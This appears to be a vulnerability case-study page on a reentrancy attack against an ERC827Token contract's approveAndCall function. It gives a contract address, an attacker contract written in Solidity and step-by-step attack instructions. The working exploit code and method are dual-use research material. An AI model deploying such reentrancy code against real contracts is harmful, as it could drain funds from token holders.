#########
Attack 03
#########

**Contract Name**

ERC827Token（test745.sol）

**Contract Address**

0x2f55045439c0361ac971686e06d5b698952f89c1

**Transaction Count**

5

**Invovled Ethers**

0.85 Ethers

**Length of the Call Chain**

1 external function

**Victim Function**

``approveAndCall``

**Attack Mechanisim**

Attack code:
::

    contract Attack{
        ERC827Token e = new ERC827Token();
        bytes  bs4 = new bytes(4);
        bytes4 functionSignature = bytes4(keccak256("attack()"));
        constructor() payable {}

        function prepareWork() {
            for (uint i = 0; i< bs4.length; i++){
                bs4[i] = functionSignature[i];
            }
        }

        function attack() public {
            e.approveAndCall.value(0)(this, 1 eth, bs4);
        }

        function() payable{}

        function getvalue() returns (uint) {
            return this.balance;
        }
    }

Attacked code:
::

    contract ERC827Token is ERC827, StandardToken {
        function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
            require(_spender != address(this));

            super.approve(_spender, _value);
        
            require(_spender.call.value(msg.value)(_data));

            return true;
        }
    ...
    }

In this case, the goal of our reentrancy is ``require(_spender.call.value(msg.value)(_data));``. To reach it, we need to make sure the address variable *_spender* does not equals to the address of ``ERC827Token``. And this can be done easily by setting an arbitrary hex string. Additionally, the ``_data`` parameter ensures we can recursively call our attack function.

**Preparation.** We set attack function's signature by calling ``prepareWork()`` function in attack code. 

**Attack.** The attacker call ``attack()`` function, it calls ``approveAndCall`` function with the parameters setted by attacker in victim contract. The ``require`` condition is satisfied because the first parameter is attacker's address. Next it goes to the key statement ``require(_spender.call.value(msg.value)(_data));`` which calls back to the ``attack()`` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.